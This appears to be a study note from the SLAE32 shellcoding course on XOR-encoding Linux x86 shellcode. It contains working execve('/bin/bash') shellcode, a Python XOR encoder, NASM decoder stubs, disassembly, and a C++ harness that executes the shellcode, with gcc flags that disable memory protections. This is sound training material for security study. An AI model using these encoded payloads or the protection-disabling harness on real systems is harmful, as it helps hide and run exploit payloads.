# XOR

## SHELL (PREP)
In order to understand how `execve` works, look at the arguments it takes, and how this translates to the registers:  

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
**execve does NOT need a return if successful**

```nasm
EAX = syscall
EBX = /bin/bash, 0x0
ECX = Address of /bin/bash, 0x00000000
EDX = 0x00000000
ESI -> /bin/bash
```

## Python (PREP)
Using the following Python3 script `XOR-encoder.py` to encode the shellcode with `0xAA`
**Note: No bytes contained in shellcode can match the `0xAA` for this lesson**  
```python
#!/usr/bin/python3

# Python3 XOR Encoder
# SLAE32

shellcode = (
# Place shellcode here
b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

encoded = ""
encoded2 = ""

print ("Encoded shellcode with XOR 0xAA...\n")

for x in shellcode:
    # XOR Encoding
    y = x^0xAA
    encoded += "\\x"
    encoded += "%02x" % y

    encoded2 += "0x"
    encoded2 += "%02x," % y

print(encoded)
print()
print(encoded2)
print()

print("Length: %d" % len(shellcode))
```


## NASM  

Level 6 (`EXECVE-Stack` shellcode) before XOR Encoding:
```nasm
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Level 6 (`EXECVE-Stack` shellcode) after XOR (`0xAA`) Encoding:
```nasm
"\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
```

### NO MARKER (Manual length defined loop)
```nasm
; EXECVE-XOR-decoder.nasm (JMP-CALL-POP)
; SLAE32
;
; XOR Decoder, no NULL, using shellcode from Module 2-6 as the basis
; Then using the Python3 script "XOR-encoder.py" to encode the shellcode with 0xAA
; Note: No bytes contained in shellcode can match the 0xAA for this lesson

global _start

section .text
_start: 
    jmp short call_decoder


decoder:
    pop esi                 ; Put Shellcode byte location (address) into ESI
    xor ecx, ecx
    mov cl, 30              ; Length of shellcode is 30 decimal


decode:
    xor byte [esi], 0xAA    ; XOR the current byte at ESI with 0xAA
    inc esi                 ; Iterate through the array
    loop decode             ; Loop until ECX is empty (30 decimal)

    jmp short Shellcode     ; Once the loop has finished, JMP to decoded Shellcode


call_decoder:
    call decoder
    Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0xc8,0xc3,0xc4,0x85,0xc2,0x85,0x85,0x85,0x85,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
```

### MARKER (Loop until NULL byte)
The manual defined loop above is still used here, but modified and commented out to show the changes:  
```nasm
; EXECVE-XOR-decoder-with-marker.nasm (JMP-CALL-POP)
; SLAE32
;
; XOR Decoder, no NULL, using shellcode from Module 2-6 as the basis
; Then using the Python3 script "XOR-encoder.py" to encode the shellcode with 0xAA
; Note: No bytes contained in shellcode can match the 0xAA for this lesson
;
; Using a marker (NULL) to let ESI determine it is finished looping upon hitting a NULL

global _start

section .text
_start: 
    jmp short call_decoder


decoder:
    pop esi                 ; Put Shellcode byte location (address) into ESI
    
    ; xor ecx, ecx
    ; mov cl, 30              ; Length of shellcode is 30 decimal


decode:
    xor byte [esi], 0xAA    ; XOR the current byte at ESI with 0xAA
    ; inc esi                 ; Iterate through the array
    ; loop decode             ; Loop until ECX is empty (30 decimal)

    jz Shellcode            ; If 0 flag is set from the XOR setting a NULL, JMP to decoded shellcode
    inc esi                 ; Iterate through the array
    jmp short decode        ; If 0 flag hasn't been set, then continue decoding, until 0xAA is XOR'd with itself, thus making a NULL

    jmp short Shellcode     ; Once the loop has finished, by hitting a NULL and getting the JZ to be true (Zero flag is set), JMP to decoded Shellcode


call_decoder:
    call decoder
    Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0xc8,0xc3,0xc4,0x85,0xc2,0x85,0x85,0x85,0x85,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a, 0xaa

```


---


## Convert to Shellcode  

Use the [compile.sh](../compile.sh) script that will automatically compile, assemble, link, and then print the shellcode for CPP consumption.  


---


## CPP  
### Header file (.h)  
```cpp
/*
Following video: Module 2-7: XOR


XOR Table:
|  A  |  B  |  A ^ B |
----------------------
|  0  |  0  |    0   |
|  1  |  1  |    0   |
|  1  |  0  |    1   |
|  0  |  1  |    1   |


; Shellcode with manual defined LOOP
    /mnt/git/NASM/SLAE32/2-7_XOR/execve-xor:     file format elf32-i386
    Disassembly of section .text:
    08049000 <_start>:
     8049000:       eb 0d                   jmp    804900f <call_decoder>
    08049002 <decoder>:
     8049002:       5e                      pop    esi
     8049003:       31 c9                   xor    ecx,ecx
     8049005:       b1 1e                   mov    cl,0x1e
    08049007 <decode>:
     8049007:       80 36 aa                xor    BYTE PTR [esi],0xaa
     804900a:       46                      inc    esi
     804900b:       e2 fa                   loop   8049007 <decode>
     804900d:       eb 05                   jmp    8049014 <Shellcode>
    0804900f <call_decoder>:
     804900f:       e8 ee ff ff ff          call   8049002 <decoder>
    08049014 <Shellcode>:
     8049014:       9b                      fwait
     8049015:       6a fa                   push   0xfffffffa
     8049017:       c2 c8 cb                ret    0xcbc8
     804901a:       d9 c2                   fld    st(2)
     804901c:       c2 c8 c3                ret    0xc3c8
     804901f:       c4 85 c2 85 85 85       les    eax,FWORD PTR [ebp-0x7a7a7a3e]
     8049025:       85 23                   test   DWORD PTR [ebx],esp
     8049027:       49                      dec    ecx
     8049028:       fa                      cli    
     8049029:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
     804902c:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
     804902f:       a1                      .byte 0xa1
     8049030:       67                      addr16
     8049031:       2a                      .byte 0x2a


; Shellcode with marker (NULL) defined loop via JZ
    /mnt/git/NASM/SLAE32/2-7_XOR/execve-xor-with-marker:     file format elf32-i386
    Disassembly of section .text:
    08049000 <_start>:
     8049000:       eb 0b                   jmp    804900d <call_decoder>
    08049002 <decoder>:
     8049002:       5e                      pop    esi
    08049003 <decode>:
     8049003:       80 36 aa                xor    BYTE PTR [esi],0xaa
     8049006:       74 0a                   je     8049012 <Shellcode>
     8049008:       46                      inc    esi
     8049009:       eb f8                   jmp    8049003 <decode>
     804900b:       eb 05                   jmp    8049012 <Shellcode>
    0804900d <call_decoder>:
     804900d:       e8 f0 ff ff ff          call   8049002 <decoder>
    08049012 <Shellcode>:
     8049012:       9b                      fwait
     8049013:       6a fa                   push   0xfffffffa
     8049015:       c2 c8 cb                ret    0xcbc8
     8049018:       d9 c2                   fld    st(2)
     804901a:       c2 c8 c3                ret    0xc3c8
     804901d:       c4 85 c2 85 85 85       les    eax,FWORD PTR [ebp-0x7a7a7a3e]
     8049023:       85 23                   test   DWORD PTR [ebx],esp
     8049025:       49                      dec    ecx
     8049026:       fa                      cli    
     8049027:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
     804902a:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
     804902d:       a1                      .byte 0xa1
     804902e:       67                      addr16
     804902f:       2a                      .byte 0x2a
     8049030:       aa                      stos   BYTE PTR es:[edi],al
*/


// Manual defined LOOP shellcode
// unsigned char shellcode[] = {
// "\xeb\x0d\x5e\x31\xc9\xb1\x1e\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8"
// "\xee\xff\xff\xff\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4"
// "\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1"
// "\x67\x2a"
// };

unsigned char shellcode[] = {
"\xeb\x0b\x5e\x80\x36\xaa\x74\x0a\x46\xeb\xf8\xeb\x05\xe8\xf0\xff"
"\xff\xff\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2"
"\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
"\xaa"
};

unsigned int shellcode_len = sizeof(shellcode)-1;
```

### CPP file (.cpp)  
```cpp
#include <stdio.h>
#include <string.h>
#include <stdint.h>		// Requirement for intptr_t/uintptr_t
// @ts-ignore
#include <sys/mman.h>	// Linux requirement for mmap / mprotect

// Clean place to keep all shellcode
#include "shellcode.h"

// Compile (x86) with:
// Note: Requires package gcc-multilib if on an x64 system
// gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
//
// DISABLE ALL PROTECTIONS:
// gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
//
// Compile (x64) with:
// gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>

int main()
{
	for (int i = 0; i < shellcode_len; i++){
		// printf("%02x ",*(shellcode + i));	// Output example: 31 c0 50 68
		printf("\\x%02x",*(shellcode + i));		// Output example: \x31\xc0\x50\x68
	}
	printf("\n");
	printf("Shellcode Length: %d\n", shellcode_len);

	// =====================================================
	// SLAE-32 method
	// Create a function pointer, that points to the raw shellcode, then call the shellcode pointer
	//
	int (*shellcode_func_ptr)() = (int(*)())shellcode;
	mprotect((void*)((uintptr_t)shellcode & ~0xFFF), 8192, PROT_READ|PROT_WRITE|PROT_EXEC);	// Required to add this to make the PAGE the shellcode is in, executable
	printf("Shellcode address: %p\n", shellcode_func_ptr);
	shellcode_func_ptr();
	// =====================================================


	// =====================================================
	// Memory Alloc method
	//
	// int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	// int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	
	// void *shellcode_mem_alloc = mmap(0, shellcode_len, prot, flags, -1, 0);

	// if(shellcode_mem_alloc == MAP_FAILED)
	// {
	// 	perror("mmap");
	// 	return 1;	// Error'd out
	// }
	// else{
	// 	memcpy(shellcode_mem_alloc, shellcode, shellcode_len);
	// 	((void(*)())shellcode_mem_alloc)();
	// }
	// =====================================================


	return 0;
}
```


---

## Compilation (GCC)

### Compile (`x86`):
_Note: Requires package `gcc-multilib` if on an `x64` system_
```shell
gcc -g -m32 -z execstack -fno-stack-protector -o shellcode-2.2 linux-shellcode-func_ptr.cpp
```

### DISABLE ALL PROTECTIONS:
```shell
gcc -m32 -w -o vuln_disable_canary -o vuln_disable_dep -o vuln_disable_pie -no-pie -z execstack -fno-stack-protector -Wl,-z,-norelro -Wa,--execstack -o shellcode shellcode-1.cpp
```

### Compile (`x64`):
```shell
gcc -g -m64 -z execstack -fno-stack-protector -o <Outfile> <shellcode template>
```